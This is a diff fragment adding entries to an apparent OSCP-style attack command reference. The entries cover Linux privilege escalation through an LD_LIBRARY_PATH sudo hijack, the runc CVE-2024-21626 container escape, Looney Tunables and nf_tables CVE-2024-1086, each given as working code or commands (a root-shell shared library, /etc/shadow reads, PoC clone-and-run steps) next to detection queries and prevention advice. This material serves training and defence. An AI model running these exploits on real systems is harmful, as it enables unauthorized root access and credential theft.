+            "tuning": "Build a per-environment allowlist of CLR-hosting processes"
+          },
+          {
+            "platform": "sentinel",
+            "name": "AMSI scan of unsigned in-memory .NET content",
+            "logic": "DeviceEvents\n| where ActionType == \"AmsiScan\" and AdditionalFields has \"dotnet\"\n| where AdditionalFields has_any (\"Rubeus\",\"Seatbelt\",\"SharpHound\",\"unsigned\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, AdditionalFields",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1620",
+              "T1059.001"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Internal .NET tooling flagged by name heuristics",
+            "tuning": "Tune name heuristics; prefer behavioral correlation with ETW gaps"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "etw"
+          ],
+          "better_with": [
+            "edr",
+            "defender-endpoint",
+            "powershell"
+          ]
+        }
       }
     },
     {
@@ -78805,6 +81627,113 @@ const COMMAND_DATA = {
       "explain": "Recovers locally stored application passwords with LaZagne:\n  LaZagne.exe all          run every module (browsers, mail clients, Wi-Fi, sysadmin tools, LSA secrets)\nAdd -vv for verbose output. It reads each app's own credential store in the current user's context; the Linux build (laZagne.py) covers Linux stores."
     },
     {
+      "id": "linux-ld-library-path",
+      "name": "LD_LIBRARY_PATH sudo env_keep library hijack",
+      "command": "sudo LD_LIBRARY_PATH=/tmp <allowed_binary>   # load attacker .so as root",
+      "description": "When sudoers preserves LD_LIBRARY_PATH (via Defaults env_keep+=LD_LIBRARY_PATH) for a command a user may run as root, the attacker builds a malicious shared object exporting a symbol the target binary resolves, places it in a writable directory, and points LD_LIBRARY_PATH there. The dynamic linker loads the attacker library into the root process, running attacker code as root. A classic GTFOBins-style sudo environment-variable hijack distinct from LD_PRELOAD.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Sudo Abuse",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "GTFOBins / HTB Linux Privilege Escalation",
+      "tags": [
+        "ld-library-path",
+        "sudo",
+        "env_keep",
+        "shared-object",
+        "library-hijack",
+        "privesc"
+      ],
+      "mitre": [
+        "T1548.003",
+        "T1574.006"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT IT IS ===\n  LD_LIBRARY_PATH adds directories the dynamic linker searches for shared libraries\n  BEFORE the system paths. If sudo keeps this variable for a root-allowed command,\n  you can force that command to load YOUR library instead of the real one.\n\n=== CHECK ===\n  sudo -l\n  # look for:  env_keep+=LD_LIBRARY_PATH   AND a command you can run as root\n  # find which libs the target needs:\n  ldd /path/to/allowed_binary\n\n=== BUILD MALICIOUS .so ===\n  # Replace a library the binary loads (e.g. libcrypt.so.1). Use a constructor so\n  # it fires on load regardless of which symbol is resolved:\n  cat > /tmp/lib.c <<'EOF'\n  #include <stdio.h>\n  #include <stdlib.h>\n  #include <unistd.h>\n  static void init(void) __attribute__((constructor));\n  void init(void){ setuid(0); setgid(0); system(\"/bin/bash -p\"); }\n  EOF\n  gcc -shared -fPIC -nostartfiles -o /tmp/libcrypt.so.1 /tmp/lib.c\n\n=== TRIGGER ===\n  sudo LD_LIBRARY_PATH=/tmp <allowed_binary>\n  # linker finds /tmp/libcrypt.so.1 first, constructor runs as root -> root shell\n\n=== NOTE vs LD_PRELOAD ===\n  LD_PRELOAD force-loads one file; LD_LIBRARY_PATH changes the SEARCH PATH so a\n  same-named library in your dir wins. Use LD_LIBRARY_PATH when env_keep allows it\n  but LD_PRELOAD is stripped.\n\n=== ALTERNATIVES ===\n  ld-preload (LD_PRELOAD variant); GTFOBins per-binary library tricks",
+      "examples": [
+        {
+          "label": "Check sudo env_keep for LD_LIBRARY_PATH",
+          "command": "sudo -l"
+        },
+        {
+          "label": "Build a constructor .so matching a needed library name",
+          "command": "gcc -shared -fPIC -nostartfiles -o /tmp/libcrypt.so.1 /tmp/lib.c"
+        },
+        {
+          "label": "Run the allowed binary with the hijacked search path",
+          "command": "sudo LD_LIBRARY_PATH=/tmp <allowed_binary>"
+        }
+      ],
+      "references": [
+        {
+          "title": "GTFOBins - LD_LIBRARY_PATH / library load",
+          "url": "https://gtfobins.github.io/"
+        },
+        {
+          "title": "HTB Academy - Linux Privilege Escalation",
+          "url": "https://academy.hackthebox.com/module/details/51"
+        },
+        {
+          "title": "man ld.so (LD_LIBRARY_PATH)",
+          "url": "https://man7.org/linux/man-pages/man8/ld.so.8.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ld-preload",
+          "note": "LD_PRELOAD variant of the same sudo library-hijack.",
+          "rel": "alternative"
+        },
+        {
+          "id": "sudo-abuse",
+          "note": "Parent technique: abusing sudoers configuration.",
+          "rel": "prereq"
+        },
+        {
+          "id": "find-suid-sgid",
+          "note": "Enumerate other local vectors when env_keep is absent.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The dynamic linker searches LD_LIBRARY_PATH directories before the default system paths. sudo normally scrubs dangerous environment variables, but if sudoers explicitly preserves LD_LIBRARY_PATH via env_keep, the attacker-controlled directory is searched first while the command runs as root, so a same-named malicious library is loaded into the privileged process.",
+        "prerequisites": "A sudoers rule letting the user run a dynamically-linked command as root, with Defaults env_keep+=LD_LIBRARY_PATH (ld.so ignores LD_LIBRARY_PATH for SUID binaries, so this specifically needs the sudo env_keep misconfiguration). A writable directory and gcc (or a precompiled .so).",
+        "impact": "Arbitrary code execution as root via a hijacked shared library - a direct, quiet local privilege escalation from a single sudoers misconfiguration.",
+        "detection": "[MITRE T1574.006] sudo invocations carrying LD_LIBRARY_PATH; root processes loading shared objects from world-writable paths (/tmp, /dev/shm, user home); auditd showing a root-owned process dlopen-ing a library outside standard library directories.",
+        "artifacts": "sudo logs recording the preserved LD_LIBRARY_PATH; auditd execve with LD_LIBRARY_PATH in the environment; a .so in /tmp or /dev/shm loaded by a setuid-root process; recently compiled library with a system library name in a writable dir.",
+        "splunk_spl": "index=linux sourcetype=\"linux:auditd\" type=EXECVE\n| search (a0=\"*LD_LIBRARY_PATH=*\" OR proctitle=\"*LD_LIBRARY_PATH=*\") proctitle=\"*sudo*\"\n| table _time, host, auid, exe, proctitle",
+        "elastic_kql": "process.name:sudo and process.env_vars:*LD_LIBRARY_PATH=/tmp* or process.env_vars:*LD_LIBRARY_PATH=/dev/shm*",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has \"sudo\" and SyslogMessage has \"LD_LIBRARY_PATH\"\n| project TimeGenerated, Computer, SyslogMessage\n| sort by TimeGenerated desc\n// sudo preserving LD_LIBRARY_PATH to load an attacker library as root",
+        "sigma_rules": "lnx_sudo_ld_library_path_hijack (sudo command run with an attacker LD_LIBRARY_PATH)",
+        "prevention": "Never add LD_LIBRARY_PATH (or LD_PRELOAD) to sudoers env_keep; rely on sudo's default env_reset. Audit /etc/sudoers and /etc/sudoers.d for env_keep entries. Keep sudo current and grant the narrowest possible commands.",
+        "sources": [
+          "https://gtfobins.github.io/",
+          "https://man7.org/linux/man-pages/man8/ld.so.8.html"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "sudo with attacker LD_LIBRARY_PATH (library hijack)",
+            "logic": "Syslog\n| where SyslogMessage has \"sudo\" and SyslogMessage has \"LD_LIBRARY_PATH\"\n| where SyslogMessage has_any (\"/tmp\",\"/dev/shm\",\"/home\")\n| project TimeGenerated, Computer, SyslogMessage",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1548.003",
+              "T1574.006"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Developers occasionally set LD_LIBRARY_PATH, but rarely through sudo to a world-writable directory.",
+            "tuning": "Alert specifically when LD_LIBRARY_PATH points at /tmp, /dev/shm or a user-writable path under sudo."
+          }
+        ]
+      }
+    },
+    {
       "id": "recon-ldap-anonymous",
       "name": "LDAP Anonymous Bind - Unauthenticated AD Enumeration",
       "command": "ldapsearch -x -H ldap://<dc_ip> -b \"DC=<domain>,DC=local\" \"(objectClass=user)\" sAMAccountName",
@@ -79808,6 +82737,112 @@ const COMMAND_DATA = {
             "confidence": "medium",
             "false_positives": "SCCM, SCOM, or other management tools querying AD; BloodHound collection",
             "tuning": "Baseline normal LDAP query volumes; whitelist known management tool IPs"
+          }
+        ]
+      }
+    },
+    {
+      "id": "linux-runc-leaky-vessels",
+      "name": "Leaky Vessels runc/containerd container escape (CVE-2024-21626)",
+      "command": "docker run -w /proc/self/fd/<n> <image>   # runc leaked-fd cwd escape to host",
+      "description": "CVE-2024-21626 (Leaky Vessels) is a container-escape bug in runc <=1.1.11 (used by Docker, containerd, CRI-O, Kubernetes). runc leaks an open file descriptor pointing at the host filesystem (an ancestor of the container's working directory). By setting the container WORKDIR (or process.cwd) to /proc/self/fd/<n>, a process inside the container resolves paths relative to the host root, allowing read/write of host files and full escape to the host as root. A build-time variant abuses the same leak via a crafted Dockerfile WORKDIR.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Container Escape",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Snyk / Leaky Vessels / CVE-2024-21626",
+      "tags": [
+        "cve-2024-21626",
+        "leaky-vessels",
+        "runc",
+        "containerd",
+        "docker",
+        "container-escape"
+      ],
+      "mitre": [
+        "T1611",
+        "T1068"
+      ],
+      "exam": "lab-only",
+      "notes": "=== WHAT IT IS ===\n  runc leaves a file descriptor open to the host filesystem when it sets up the\n  container. If the container's working directory is set to that leaked fd via\n  /proc/self/fd/<n>, the container process operates on the HOST filesystem (outside\n  the container root), giving read/write to host files as root -> full escape.\n\n=== AFFECTED ===\n  runc <= 1.1.11 (fixed in 1.1.12). Pulls in Docker Engine < 25.0.2 /\n  containerd < 1.6.28 / 1.7.13, CRI-O, and Kubernetes nodes using them.\n  docker --version ; runc --version ; containerd --version\n\n=== RUNTIME VARIANT (run with attacker-chosen WORKDIR) ===\n  # The leaked fd number varies (commonly 7-9). Point cwd at it and read/write host:\n  docker run --rm -w /proc/self/fd/8 <image> \\\n    bash -c 'cat /etc/shadow; echo PWNED > /host_file'\n  # Writing to ../../../../etc/cron.d/x or a host SUID path escalates on the host.\n\n=== BUILD VARIANT (malicious Dockerfile) ===\n  # In a Dockerfile:  WORKDIR /proc/self/fd/8  then RUN a command that touches the\n  # host filesystem during 'docker build'. PoC repos: snyk/leaky-vessels-dynamic-detector,\n  # NitroCao/CVE-2024-21626, Wall1e/CVE-2024-21626-POC.\n\n=== PoC REPOS ===\n  git clone https://github.com/NitroCao/CVE-2024-21626\n  # follow the repo: build the image, run with -w /proc/self/fd/<n>, confirm host access.\n\n=== ALTERNATIVES ===\n  cgroup release_agent escape; docker-socket abuse; --privileged container escape",
+      "examples": [
+        {
+          "label": "Check runtime versions for the vulnerable range",
+          "command": "docker --version; runc --version; containerd --version"
+        },
+        {
+          "label": "Escape at runtime via a leaked-fd working directory",
+          "command": "docker run --rm -w /proc/self/fd/8 <image> bash -c 'ls -la /; cat /etc/shadow'"
+        },
+        {
+          "label": "Write a host file to confirm the escape",
+          "command": "docker run --rm -w /proc/self/fd/8 <image> bash -c 'echo pwn > ../../../../tmp/escape_proof'"
+        }
+      ],
+      "references": [
+        {
+          "title": "NVD - CVE-2024-21626",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
+        },
+        {
+          "title": "Snyk - Leaky Vessels disclosure",
+          "url": "https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/"
+        },
+        {
+          "title": "PoC - NitroCao/CVE-2024-21626",
+          "url": "https://github.com/NitroCao/CVE-2024-21626"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "linux-docker-escape",
+          "note": "Broader Docker/container escape techniques.",
+          "rel": "alternative"
+        },
+        {
+          "id": "docker-socket-exposed",
+          "note": "Another container-to-host path when the socket is mounted.",
+          "rel": "alternative"
+        },
+        {
+          "id": "linux-cgroup-release-agent-escape",
+          "note": "cgroup release_agent escape as a sibling technique.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "During container setup runc keeps a file descriptor open to a directory on the host filesystem and does not close it before handing control to the container process. Because /proc/self/fd/<n> dereferences to that host directory, a container that sets its working directory (process.cwd) to the leaked fd resolves relative paths against the host root, escaping the container mount namespace with the container's (often root) privileges.",
+        "prerequisites": "The ability to run a container (or submit an image/Dockerfile to a build) on a host using runc <=1.1.11 / Docker <25.0.2 / containerd <1.6.28 or <1.7.13. No host credentials needed - just control of a container's WORKDIR/cwd or build steps.",
+        "impact": "Full container-to-host escape with read/write of host files as root, defeating the container boundary - critical in multi-tenant Docker/Kubernetes and CI build environments.",
+        "detection": "[MITRE T1611] Containers whose working directory or process cwd is set to /proc/self/fd/<n>; container processes accessing host paths via a /proc/self/fd symlink; docker run -w /proc/self/fd/... or a Dockerfile WORKDIR under /proc/self/fd; unexpected host-filesystem writes originating from a container runtime.",
+        "artifacts": "auditd/EDR records of a container process opening paths under /proc/self/fd that resolve outside the container rootfs; docker/containerd logs showing an unusual WORKDIR; host files modified with a container runtime as the writer; runc debug logs.",
+        "splunk_spl": "index=linux (sourcetype=\"linux:auditd\" OR sourcetype=docker)\n| search (proctitle=\"*/proc/self/fd/*\" OR ProcessCommandLine=\"*-w /proc/self/fd/*\" OR CONTAINER_WORKDIR=\"*/proc/self/fd/*\")\n| table _time, host, exe, proctitle",
+        "elastic_kql": "process.args:*\\/proc\\/self\\/fd\\/* and (process.name:runc or container.runtime:* or process.args:*\\-w*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where ProcessCommandLine has \"/proc/self/fd/\" and (ProcessCommandLine has \"-w \" or ProcessCommandLine has \"WORKDIR\" or InitiatingProcessFileName in (\"runc\",\"containerd-shim\",\"dockerd\"))\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n// container cwd set to a leaked host fd (CVE-2024-21626)",
+        "sigma_rules": "lnx_runc_leaked_fd_cwd_escape (container WORKDIR/cwd pointing at /proc/self/fd/<n>)",
+        "prevention": "Upgrade runc to 1.1.12+ and the bundled Docker (25.0.2+) / containerd (1.6.28+/1.7.13+) / CRI-O. Scan images and Dockerfiles for WORKDIR under /proc/self/fd; restrict who can run containers or push build jobs; enable runtime detection for /proc/self/fd cwd and host-path access from containers.",
+        "sources": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-21626",
+          "https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Container cwd set to leaked host fd (Leaky Vessels)",
+            "logic": "DeviceProcessEvents\n| where ProcessCommandLine has \"/proc/self/fd/\"\n| where ProcessCommandLine has \"-w \" or ProcessCommandLine has \"WORKDIR\" or InitiatingProcessFileName in (\"runc\",\"containerd-shim\",\"dockerd\")\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine",
+            "data_source": "edr",
+            "attack": [
+              "T1611"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate use of /proc/self/fd as a container working directory is extremely rare.",
+            "tuning": "Alert on any container WORKDIR/cwd under /proc/self/fd; correlate with host-path file access by a container runtime."
           }
         ]
       }
@@ -86923,6 +89958,111 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Brute-forces RIDs to enumerate users, groups, and the domain SID:\n  lookupsid.py <domain>/<user>@<dc_ip>   authenticate and walk the SID space\nReturns the domain SID plus account names by RID; it works across trusts, so you can enumerate a foreign domain's users with your current creds - grep for 'Domain SID' to grab the SID for ticket forging."
+    },
+    {
+      "id": "linux-looney-tunables",
+      "name": "Looney Tunables - glibc ld.so GLIBC_TUNABLES LPE (CVE-2023-4911)",
+      "command": "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A... <suid_binary>",
+      "description": "CVE-2023-4911 (Looney Tunables) is a buffer overflow in glibc's dynamic loader ld.so when it processes the GLIBC_TUNABLES environment variable. Because ld.so runs with elevated privileges for SUID binaries, a crafted GLIBC_TUNABLES value corrupts memory during startup of any SUID-root program and yields a local root shell. Affects glibc 2.34 through 2.38 as shipped on Fedora 37/38, Ubuntu 22.04/23.04, Debian 12/13 and others.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Kernel and glibc Exploits",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Qualys TRU / CVE-2023-4911",
+      "tags": [
+        "cve-2023-4911",
+        "looney-tunables",
+        "glibc",
+        "ld.so",
+        "privesc",
+        "buffer-overflow"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT IT IS ===\n  A buffer overflow in __tunables_init() when ld.so parses GLIBC_TUNABLES. SUID binaries\n  still honor a sanitized tunables string, and the overflow happens before privileges drop,\n  so a crafted value overwrites the saved stack/state and hijacks execution as root.\n\n=== CHECK GLIBC VERSION ===\n  ldd --version                 # 'ldd (GNU libc) 2.35' etc\n  getconf GNU_LIBC_VERSION\n  # Vulnerable: 2.34 - 2.38 (released 2021-08 .. 2023-07) before the 2023-10 fix.\n\n=== TRIGGER (manual probe) ===\n  # A long malformed tunable crashes a SUID binary (proof it parses attacker input):\n  env -i 'GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=AAAA..(very long)..' /usr/bin/su --help\n  # A segfault in ld.so confirms the parser reaches the vulnerable path.\n\n=== PUBLIC PoC ===\n  git clone https://github.com/leesh3288/CVE-2023-4911\n  cd CVE-2023-4911 && gcc -o exp exp.c && ./exp\n  # Other PoCs: RootkitSmith/CVE-2023-4911, drmchen, flyyy chain the overflow to a root shell\n  # by corrupting ld.so state so a chosen library/symbol runs as root.\n\n=== TARGET BINARY ===\n  # Any SUID-root dynamically-linked binary works as the vector; /usr/bin/su and\n  # mount/umount/sudo are common. ls -la /usr/bin/su to confirm the SUID bit.\n\n=== ALTERNATIVES ===\n  dirtypipe / overlayfs CVE-2023-0386 / nf_tables CVE-2024-1086   # other local root chains",
+      "examples": [
+        {
+          "label": "Confirm glibc version (2.34-2.38 vulnerable)",
+          "command": "ldd --version"
+        },
+        {
+          "label": "Build and run a public PoC to root",
+          "command": "git clone https://github.com/leesh3288/CVE-2023-4911 && cd CVE-2023-4911 && gcc -o exp exp.c && ./exp"
+        },
+        {
+          "label": "Confirm root after exploitation",
+          "command": "id"
+        }
+      ],
+      "references": [
+        {
+          "title": "NVD - CVE-2023-4911",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4911"
+        },
+        {
+          "title": "Qualys TRU advisory (Looney Tunables)",
+          "url": "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt"
+        },
+        {
+          "title": "PoC - leesh3288/CVE-2023-4911",
+          "url": "https://github.com/leesh3288/CVE-2023-4911"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "kernel-exploit-generic",
+          "note": "Same goal (local root) via a kernel bug when glibc is patched.",
+          "rel": "alternative"
+        },
+        {
+          "id": "linux-overlayfs-cve-2023-0386",
+          "note": "Another 2023 local-root chain to try alongside this one.",
+          "rel": "alternative"
+        },
+        {
+          "id": "find-suid-sgid",
+          "note": "Enumerate SUID binaries to pick a vector for the overflow.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "glibc's ld.so sanitizes GLIBC_TUNABLES for SUID binaries but a bug in __tunables_init() mishandles an attacker-controlled tunable of the form name=name=value, overflowing a stack buffer during loader initialization. This happens before the SUID program drops privileges, so memory corruption executes with root's effective UID.",
+        "prerequisites": "A local unprivileged shell and any SUID-root dynamically-linked binary. Vulnerable glibc 2.34-2.38 (default on Fedora 37/38, Ubuntu 22.04/23.04, Debian 12) with no 2023-10 patch.",
+        "impact": "Reliable local privilege escalation to root on default installations - one of the most widely exploitable Linux LPEs of 2023 because the vector (SUID + stock glibc) is near-universal.",
+        "detection": "[MITRE T1068] Processes spawned with a GLIBC_TUNABLES value containing a repeated tunable name (name=name=) or an abnormally long value; SUID binaries (su, mount, sudo) crashing in ld.so; a root shell parented to an unprivileged process immediately after a short-lived SUID exec.",
+        "artifacts": "auditd execve records capturing GLIBC_TUNABLES in the environment; core dumps / dmesg segfault entries for ld.so inside SUID binaries; EDR process-tree showing uid=0 child of an unprivileged user.",
+        "splunk_spl": "index=linux sourcetype=\"linux:auditd\" type=EXECVE\n| search a0=\"*GLIBC_TUNABLES*\" OR proctitle=\"*GLIBC_TUNABLES*glibc.malloc*\"\n| table _time, host, auid, exe, proctitle",
+        "elastic_kql": "process.env_vars:*GLIBC_TUNABLES* and process.env_vars:*glibc.malloc.mxfast=glibc.malloc*",
+        "sentinel_kql": "DeviceProcessEvents\n| where ProcessCommandLine has \"GLIBC_TUNABLES\" and ProcessCommandLine has \"glibc.malloc\"\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| sort by TimeGenerated desc\n// repeated tunable name (name=name=) overflowing ld.so in a SUID binary",
+        "sigma_rules": "lnx_glibc_tunables_suid_overflow (GLIBC_TUNABLES repeated-name overflow against a SUID binary)",
+        "prevention": "Patch glibc to the fixed build (Fedora glibc-2.38-11+, Ubuntu 2.35-0ubuntu3.4 / 2.37-0ubuntu2.1, Debian 2.36-9+deb12u3) released 2023-10-03. Where patching lags, strip the SUID bit from non-essential binaries and deploy with the hardened loader. Monitor auditd execve for GLIBC_TUNABLES.",
+        "sources": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2023-4911",
+          "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "GLIBC_TUNABLES overflow against SUID binary (Looney Tunables)",
+            "logic": "DeviceProcessEvents\n| where ProcessCommandLine has \"GLIBC_TUNABLES\" and ProcessCommandLine has \"glibc.malloc\"\n| extend repeated = ProcessCommandLine has \"=glibc.malloc.mxfast=glibc.malloc.mxfast=\"\n| where repeated or strlen(ProcessCommandLine) > 400\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate tuning of glibc.malloc via GLIBC_TUNABLES is rare and never uses a repeated tunable name.",
+            "tuning": "Alert on the repeated name=name= pattern or abnormally long values; allowlist known performance-tuning wrappers."
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-lsass-dump-detection",
@@ -107239,6 +110379,111 @@ const COMMAND_DATA = {
       "explain": "Matches the kernel to a netfilter (nf_tables) local-root exploit:\n  uname -r                 print the kernel release to compare against the CVE ranges\nThe variations map ranges to exploits: CVE-2021-22555 (2.6-5.11), CVE-2022-25636 (5.4-5.6.10), CVE-2023-32233 (up to 6.3.1) - clone, compile, and run the matching one for root."
     },
     {
+      "id": "linux-nftables-cve-2024-1086",
+      "name": "netfilter nf_tables use-after-free LPE (CVE-2024-1086)",
+      "command": "./exploit   # nf_tables UAF via nft_verdict NF_DROP/NF_ACCEPT double-free",
+      "description": "CVE-2024-1086 is a use-after-free in the Linux kernel netfilter nf_tables subsystem: nft_verdict_init() allows a positive value as the drop error, and nf_hook_slow() then performs a double-free of the skb when NF_DROP is issued with such a verdict. An unprivileged user (with unprivileged user namespaces enabled) crafts nf_tables rules to trigger the UAF, reclaims the freed object, and escalates to root. Affects Linux kernels 5.14 through 6.6 (and some 6.7); fixed 2024-01.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Kernel and glibc Exploits",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Notselwyn / CVE-2024-1086",
+      "tags": [
+        "cve-2024-1086",
+        "nf_tables",
+        "netfilter",
+        "use-after-free",
+        "kernel",
+        "privesc"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT IT IS ===\n  A double-free/UAF in netfilter nf_tables: nft_verdict_init() accepts a positive\n  value for the verdict drop code, and nf_hook_slow() double-frees the socket buffer\n  on NF_DROP. The reliable public exploit reclaims the freed object to gain a\n  kernel read/write primitive and overwrite credentials -> root.\n\n=== PREREQUISITES CHECK ===\n  uname -r                                        # vulnerable: 5.14 .. 6.6 (some 6.7)\n  sysctl kernel.unprivileged_userns_clone         # exploit needs userns = 1\n  cat /proc/sys/user/max_user_namespaces\n\n=== PUBLIC PoC (Notselwyn 'flipping pages') ===\n  git clone https://github.com/Notselwyn/CVE-2024-1086\n  cd CVE-2024-1086\n  make                      # produces ./exploit\n  ./exploit                 # pops a root shell on a supported kernel\n  # The exploit uses a Dirty Pagedirectory-style page-UAF ('flipping pages') and\n  # is tuned per-kernel; read the repo's supported-versions list first.\n\n=== OPSEC ===\n  # It toggles the hostname and can leave the box unstable on an unsupported kernel;\n  # confirm the exact kernel is in-scope before running on anything important.\n\n=== ALTERNATIVES ===\n  overlayfs CVE-2023-0386 / looney-tunables CVE-2023-4911 / dirtypipe",
+      "examples": [
+        {
+          "label": "Confirm kernel 5.14-6.6 and userns enabled",
+          "command": "uname -r; sysctl kernel.unprivileged_userns_clone"
+        },
+        {
+          "label": "Build the Notselwyn PoC",
+          "command": "git clone https://github.com/Notselwyn/CVE-2024-1086 && cd CVE-2024-1086 && make"
+        },
+        {
+          "label": "Run the exploit to get a root shell",
+          "command": "./exploit"
+        }
+      ],
+      "references": [
+        {
+          "title": "NVD - CVE-2024-1086",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"
+        },
+        {
+          "title": "PoC + writeup - Notselwyn/CVE-2024-1086",
+          "url": "https://github.com/Notselwyn/CVE-2024-1086"
+        },
+        {
+          "title": "Notselwyn - Flipping Pages writeup",
+          "url": "https://pwning.tech/nftables/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "kernel-exploit-generic",
+          "note": "General kernel-exploit methodology this fits.",
+          "rel": "prereq"
+        },
+        {
+          "id": "linux-overlayfs-cve-2023-0386",
+          "note": "Non-memory-corruption local root as a safer alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "dirty-pipe",
+          "note": "Another kernel local-root primitive to compare.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "nft_verdict_init() in nf_tables accepts a positive integer as a verdict's drop error code; nf_hook_slow() then frees the skb twice when that NF_DROP verdict is reached. An unprivileged user, who can create nf_tables inside their own network namespace via unprivileged user namespaces, builds rules that drive the double-free, reclaims the freed page/object, and overwrites kernel credentials.",
+        "prerequisites": "Local unprivileged shell. Kernel 5.14-6.6 (some 6.7) without the fix, and unprivileged user namespaces enabled so the user can program nf_tables. No special capabilities on the host otherwise.",
+        "impact": "Reliable local root on a broad range of recent kernels, including default Debian 12 and Ubuntu 23.x builds, via a kernel read/write primitive and credential overwrite.",
+        "detection": "[MITRE T1068] Unprivileged processes creating network namespaces and programming nf_tables (nft/newtable/newchain netlink) in quick succession; kernel oops/warn entries referencing nf_tables or skb double-free in dmesg; a root shell parented by an unprivileged process; unexpected hostname changes left by the public exploit.",
+        "artifacts": "auditd execve for unshare/nft by a non-root auid; NFTA netlink activity from an unprivileged namespace; dmesg/kernel log UAF or BUG traces in nf_tables; EDR process tree with uid transition to 0.",
+        "splunk_spl": "index=linux sourcetype=\"linux:auditd\" type=EXECVE\n| search (proctitle=\"*unshare*\" OR exe=\"*/nft\" OR proctitle=\"*nft *\")\n| where auid!=0\n| stats values(proctitle) as cmds by _time, host, auid\n| search cmds=\"*unshare*\" cmds=\"*nft*\"",
+        "elastic_kql": "process.name:(unshare or nft) and not user.name:root and process.args:(*user* or *net* or *add* or *table*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessAccountName != \"root\"\n| where FileName in (\"unshare\",\"nft\") or ProcessCommandLine has \"nft add table\"\n| summarize cmds=make_set(ProcessCommandLine) by DeviceName, InitiatingProcessAccountName, bin(TimeGenerated, 1m)\n| where cmds has \"unshare\" and cmds has \"nft\"\n// unprivileged nf_tables programming preceding a root shell (CVE-2024-1086)",
+        "sigma_rules": "lnx_nftables_unpriv_userns_uaf (unprivileged userns + nf_tables programming consistent with CVE-2024-1086)",
+        "prevention": "Patch to a fixed kernel (the 2024-01-31 nf_tables fix; Ubuntu/Debian/RHEL vendor updates). As a strong mitigation, set kernel.unprivileged_userns_clone=0 (or sysctl user.max_user_namespaces=0) so unprivileged users cannot program nf_tables; blocklist the nf_tables module where unused.",
+        "sources": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-1086",
+          "https://pwning.tech/nftables/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Unprivileged userns + nf_tables programming (CVE-2024-1086)",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessAccountName != \"root\"\n| where FileName in (\"unshare\",\"nft\") or ProcessCommandLine has \"nft add table\"\n| summarize cmds=make_set(ProcessCommandLine) by DeviceName, InitiatingProcessAccountName, bin(TimeGenerated, 2m)\n| where cmds has_any (\"unshare\") and array_length(cmds) > 1",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Container runtimes and network tooling legitimately create namespaces and program nf_tables.",
+            "tuning": "Require the actor to be non-root and unprivileged; correlate with kernel UAF/oops logs and a subsequent uid=0 shell."
+          }
+        ]
+      }
+    },
+    {
